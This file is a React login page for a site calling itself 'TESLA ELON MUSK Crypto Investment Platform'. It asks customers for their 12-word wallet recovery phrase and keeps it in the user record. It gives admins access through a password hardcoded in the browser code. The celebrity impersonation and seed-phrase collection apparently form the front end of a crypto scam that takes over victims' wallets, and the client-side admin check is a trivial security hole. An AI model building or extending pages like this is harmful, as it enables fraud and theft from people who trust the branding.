import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useAuthStore } from '../store/authStore';
import { Rocket } from 'lucide-react';

export const Login: React.FC = () => {
  const [recoveryPhrase, setRecoveryPhrase] = useState('');
  const [password, setPassword] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);
  const navigate = useNavigate();
  const { setUser } = useAuthStore();

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    
    if (isAdmin && password === '00993366') {
      setUser({
        id: 'admin',
        username: 'Admin',
        role: 'admin',
        balance: { bitcoin: 0, ethereum: 0, solana: 0, ton: 0, usdt: 0, tesla: 0 }
      });
      navigate('/admin');
    } else if (!isAdmin) {
      const newPhrase = Array(12).fill(0).map(() => 
        Math.random().toString(36).substring(2, 7)).join(' ');
      
      setUser({
        id: crypto.randomUUID(),
        username: 'Customer',
        role: 'customer',
        phrase: recoveryPhrase || newPhrase,
        balance: { bitcoin: 0, ethereum: 0, solana: 0, ton: 0, usdt: 0, tesla: 0 }
      });
      navigate('/dashboard');
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-gray-900 via-red-900 to-gray-900">
      <div className="max-w-md w-full space-y-8 p-8 bg-gray-800/50 backdrop-blur-sm rounded-xl shadow-lg border border-gray-700">
        <div className="flex flex-col items-center">
          <Rocket className="text-red-500 w-16 h-16" />
          <h2 className="mt-6 text-center text-3xl font-extrabold text-white">
            TESLA ELON MUSK
          </h2>
          <p className="mt-2 text-center text-sm text-gray-400">
            Crypto Investment Platform
          </p>
        </div>

        <div className="flex justify-center space-x-4">
          <button
            onClick={() => setIsAdmin(false)}
            className={`px-4 py-2 rounded-md ${!isAdmin ? 'bg-red-600 text-white' : 'bg-gray-700 text-gray-300'}`}
          >
            Customer
          </button>
          <button
            onClick={() => setIsAdmin(true)}
            className={`px-4 py-2 rounded-md ${isAdmin ? 'bg-red-600 text-white' : 'bg-gray-700 text-gray-300'}`}
          >
            Admin
          </button>
        </div>

        <form className="mt-8 space-y-6" onSubmit={handleLogin}>
          {isAdmin ? (
            <div>
              <input
                type="password"
                required
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="appearance-none rounded-lg relative block w-full px-3 py-2 border border-gray-700 bg-gray-700/50 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
                placeholder="Admin Password"
              />
            </div>
          ) : (
            <div>
              <input
                type="text"
                value={recoveryPhrase}
                onChange={(e) => setRecoveryPhrase(e.target.value)}
                className="appearance-none rounded-lg relative block w-full px-3 py-2 border border-gray-700 bg-gray-700/50 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-500 focus:border-transparent"
                placeholder="Enter 12-word recovery phrase (or leave empty for new account)"
              />
            </div>
          )}

          <button
            type="submit"
            className="group relative w-full flex justify-center py-3 px-4 border border-transparent text-sm font-medium rounded-md text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500"
          >
            {isAdmin ? 'Admin Login' : (recoveryPhrase ? 'Access Wallet' : 'Create New Wallet')}
          </button>
        </form>
      </div>
    </div>
  );
};